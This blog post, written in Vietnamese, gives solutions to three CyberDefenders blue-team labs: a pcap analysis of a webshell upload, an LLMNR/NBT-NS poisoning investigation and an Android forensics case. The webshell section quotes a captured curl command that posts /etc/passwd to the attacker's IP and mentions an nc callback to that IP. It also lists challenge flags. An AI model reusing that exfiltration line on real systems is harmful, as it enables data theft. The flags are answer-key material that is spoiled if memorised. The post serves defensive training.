---
title: (VietNamese) CyberDefenders Writeup (Author)
date: 2026-3-20 08:19:33
top_img: /img/cyberdefenders/cyberdefenders
cover: /img/cyberdefenders/cyberdefenders.png
categories:
  - Forensics
toc: true
---
# Nơi đây lưu trữ các lời giải của các bài lab trên [Cyperdefenders](https://cyberdefenders.org) mà mình làm ^^

# [Webstrike Lab](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/)

**Tool sử dụng trong bài**: Wireshark

**Scenario** (tình huống): Một điểm bất thường đã được phát hiện trong mạng nội bộ của công ty chúng tôi khi nhóm dev đã tìm thấy một tệp bất thường trên webserver. Nghi ngờ có mã độc, nhóm mạng đã chuẩn bị một tệp pcap có network traffic quan trọng để phân tích cho nhóm bảo mật. Hãy phân tích gói pcap.

Với bài lần này, ta được cung cấp 1 file **pcap** 

----

## Solution
## Câu  1
Vì là người tấn công thì thường là người bắt đầu gói tin, nên mình sẽ lấy địa chỉ ip source của packet đầu tiên

![image](https://hackmd.io/_uploads/ryT-NGw9Zl.png)

Mình thử check địa chỉ **117.11.88.124** ở tại vị trí nào bằng [Ip location](https://www.iplocation.net/)

![image](https://hackmd.io/_uploads/SJUa7GPcWg.png)


Vậy flag là `Tianjin`


## Câu  2
![image](https://hackmd.io/_uploads/Sy_BVfPqWe.png)

Câu này bắt chúng ta tìm xem user-agent . Vậy user-agent là gì  ?
User-agent gồm các thông tin sau : 
>Phiên bản của trình duyệt
Hệ điều hành của bên bạn
Loại thiết bị (vd: Tablet, smartphone, laptop,...)
1 vài thông tin khác về client software

Bây giờ ta filter để tìm user-agent có command sau `ip.src==117.11.88.124 && http.user_agent`
![image](https://hackmd.io/_uploads/HkLOBfD5We.png)


## Câu  3
![image](https://hackmd.io/_uploads/r10r4GPqbg.png)
Câu này hỏi chúng ta là tên của webshell được upload lên là gì 

Thử filter các packet GET và POST vì nó thường được dùng để upload file lên
`http.request.method == POST` hoặc có thể dùng File -> Export object -> HTTP .

Có 2 packet đáng nghi là 53 và 63 
![image](https://hackmd.io/_uploads/r1nJDMvq-e.png)

Soi packet 63 thì mình thấy được 1 file lạ được up lên và nó đúng với format của đề bài
![image](https://hackmd.io/_uploads/By1oPMv5We.png)
Vậy flag là : `image.jpg.php
`

## Câu  4
Câu này hỏi được dẫn thư mục mà webshell ở câu 3 được up lên  
![image](https://hackmd.io/_uploads/B1STvfD5bl.png)
Thử filter `http.request.method == POST` và follow theo HTTP mình thấy được GET lên 1 thư mục là /reviews/uploads 
![image](https://hackmd.io/_uploads/Bk9cuGv9We.png)

Vậy flag là **/reviews/upload.php** 

## Câu  5
Câu này hỏi port 
![image](https://hackmd.io/_uploads/ryKyufvc-e.png)
Nhìn ở packet 63 ở câu số 3 thì mình thấy có lệnh nc vào ip 117.11.88.124 ở port 8080 vậy flag là **8080**
## Câu  6
Hỏi kẻ địch lấy đi file nào
![image](https://hackmd.io/_uploads/SyVQYGP9-e.png)

Vì webshell đang sử dụng nc nên có thể giới hạn protool là tcp hoặc udp

Thử filter theo command : `tcp.payload and tcp and !http`

![image](https://hackmd.io/_uploads/BkqRtzv5-l.png)
Ở cuối có dòng `curl -X POST -d /etc/passwd http://117.11.88.124:443/`
Vậy là kẻ địch cố lấy đi file passwd suy ra flag là `passwd`



# [PoisonedCredentials Lab](https://cyberdefenders.org/blueteam-ctf-challenges/poisonedcredentials/)

**Tool sử dụng trong bài**: Wireshark

**Scenario** (tình huống): 
>Your organization's security team has detected a surge in suspicious network activity. There are concerns that LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning attacks may be occurring within your network. These attacks are known for exploiting these protocols to intercept network traffic and potentially compromise user credentials. Your task is to investigate the network logs and examine captured network traffic.

Tóm tắt : 
Đội ngũ bảo mật của tổ chức phát hiện lưu lượng mạng đáng ngờ tăng mạnh. Họ nghi ngờ trong mạng đang xảy ra tấn công LLMNR và NBT-NS poisoning. Kiểu tấn công này lợi dụng hai giao thức trên để đánh chặn lưu lượng mạng và có thể đánh cắp hoặc làm lộ thông tin đăng nhập của người dùng. Nhiệm vụ của bạn là điều tra log mạng và phân tích gói tin đã capture để xác minh sự việc.

Giải thích : 
- LLMNR (Link-Local Multicast Name Resolution) là giao thức của Microsoft (từ Windows Vista) cho phép các thiết bị trong cùng mạng cục bộ (LAN) phân giải tên máy chủ thành địa chỉ IP khi truy vấn DNS thất bại. Nó hoạt động như cơ chế dự phòng, thay thế NetBIOS, cho phép tìm kiếm máy in/chia sẻ tệp mà không cần máy chủ DNS trung tâm
- SMB(Server Message Block): Là giao thức chia sẻ file của Windows.
- LLMNR và NBT-NS được sử dụng khi DNS request fail trên hệ thông của Windows. Khi đó 2 giao thức này sẽ đóng vai trò như name resolution dự phòng (fallback name resolution)
- LLMNR và NBT-NS có thể triển khai thành Poisoning attack bằng cách lợi dụng việc client gửi sai SMB share adress, khi này DNS sẽ trả về kết quả không thấy địa chỉ đó. Sau đó hệ thông máy tính của client sẽ tự động đổi qua LLMNR / NBT-NS request và kẻ tấn công có thể lợi dụng điều đó để tạo ra server xác nhận rằng đúng địa chỉ.

* Mô phỏng qua cuộc tấn công 
![image](https://hackmd.io/_uploads/r12AqvCcZg.png)

## Solution 
## Câu 1
 >Tìm query bị gõ sai của ip 192.168.232.162

![image](https://hackmd.io/_uploads/r1cu23wq-e.png)

Mở wireshark filter thử 
`ip.addr == 192.168.232.162 and llmnr`
![image](https://hackmd.io/_uploads/rkOlDwAc-x.png)
Vậy flag là `fileshaare`

## Câu 2 
>Tìm địa chỉ ip máy khả nghi 

![image](https://hackmd.io/_uploads/B1YzPvAqWx.png)
![image](https://hackmd.io/_uploads/r10HnPAc-g.png)

Vẫn filter theo command cũ 
Và mình nhận ra tại packet 71, 72 , .... có cùng 1 ip source thử nhập ip đó vào flag 


![image](https://hackmd.io/_uploads/Hy7ShPRqWl.png)

## Câu 3
> Tìm địa chỉ máy đã bị tấn công
![image](https://hackmd.io/_uploads/r1PrAPAcWx.png)

Vì đã có địa chỉ máy khả nghi ở câu 2 nên ta thử filter theo 
`ip.src == 192.168.232.215 and llmnr`
![image](https://hackmd.io/_uploads/SJ0nn_Aq-g.png)


Sau khi filter thu được 2 địa chỉ 
* 192.168.232.162
* 192.168.232.176

Yah thử 2 ip vào thì ra flag là 
`192.168.232.176`


## Câu 4
>Tài khoản nào đã gửi credential cho attacker?

![image](https://hackmd.io/_uploads/B1Ncg-ys-e.png)
Vì biết được attacker dùng protocol SMB hoặc SMB2 nên mình đã filter như sau : 

![image](https://hackmd.io/_uploads/HkO8WWJjZx.png)

Ở packet 242 thấy user name là **janesmith**

Vậy flag là `janesmith`

## Câu 5 
>Tên của hostname bị tấn công qua SMB 

![image](https://hackmd.io/_uploads/BJfyM-Ji-x.png)

Thử tra google về cách identify hostname mình tìm được kết quả 
![image](https://hackmd.io/_uploads/BySpzWkjZg.png)
Và flag là : `AccountingPC`
![image](https://hackmd.io/_uploads/SyVSVZksWg.png)



# [The Crime Lab](https://cyberdefenders.org/blueteam-ctf-challenges/the-crime/)

**Tool sử dụng trong bài**: 
[ALLEAPP](https://github.com/abrignoni/ALEAPP/releases/tag/v3.4.1) , **DB Browser for SQLite**

**Scenario** (tình huống): We're currently in the midst of a murder investigation, and we've obtained the victim's phone as a key piece of evidence. After conducting interviews with witnesses and those in the victim's inner circle, your objective is to meticulously analyze the information we've gathered and diligently trace the evidence to piece together the sequence of events leading up to the incident.

Đây là lab đầu tiên mình làm về android :D 


----

## Solution
## Câu  1
Based on the accounts of the witnesses and individuals close to the victim, it has become clear that the victim was interested in trading. This has led him to invest all of his money and acquire debt. Can you identify the `SHA256` of the trading application the victim primarily used on his phone?
![image](https://hackmd.io/_uploads/HkO4F9_T-x.png)

Sau khi chạy ALEAPP mình vào report kiểm tra thì thấy 1 app trading 
![image](https://hackmd.io/_uploads/r1Uit5up-e.png)
Vậy ta có thể xác định app trading câu hỏi nhắc đến là app này 
![image](https://hackmd.io/_uploads/H16TK5_p-l.png)
Vậy flag là : `4f168a772350f283a1c49e78c1548d7c2c6c05106d8b9feb825fdc3466e9df3c`

## Câu  2
![image](https://hackmd.io/_uploads/SkyfAqu6-e.png)
Câu hỏi hỏi số tiền vậy ta có thể check phần msg trong ALEAPP để xem thông tin 
![image](https://hackmd.io/_uploads/BkyrCcOpWg.png)
Vậy flag là `250,000`

## Câu 3
![image](https://hackmd.io/_uploads/By58A5uaWg.png)
Câu này hỏi name người cho vay tiền ở msg có address id vậy ta có thể dựa vào đó để tìm tên qua số điện thoại : 
![image](https://hackmd.io/_uploads/HyM509O6bg.png)
Vậy flag là : `Shady Wahab`

## Câu 4 
![image](https://hackmd.io/_uploads/SkphC5u6bg.png)
Câu hỏi này bảo tìm địa điểm victim đến vào ngày : `September 20, 2023`

![image](https://hackmd.io/_uploads/rJCl1od6Ze.png)
Trong discord chat có một msg nói về cuộc đi chơi đến bảo tàng 
`What a wonderful news! We'll meet at **The Mob Museum**, I'll await your call when you arrive. Enjoy you flight bro ❤️	`

Nhưng nhập `The Mob Museum` thì báo sai flag 

Bí quá nên mình đã xem hint 
![image](https://hackmd.io/_uploads/rkmnWod6bx.png)
Victim đã chụp ảnh màn hình trong google map 
![image](https://hackmd.io/_uploads/H10Kzidabx.png)
Ở rêcnt actiity có 1 tấm snapshot như vậy 
=>> Flag là : `The Nile Ritz-Carlton`

## Câu 5 
![image](https://hackmd.io/_uploads/SydMbiu6bg.png)
Trong google photo có ảnh vé máy bay đi đến lasvegas so flag là Las Vegas , éo biết giải thích thêm gì :x 
![image](https://hackmd.io/_uploads/Hk9r-oOabg.png)

## Câu 6 
![image](https://hackmd.io/_uploads/ry8LZoOTWl.png)
Câu này mới hỏi địa điểm mà mình đề cập ở câu 4 
Vậy flag là : `The Mob Museum`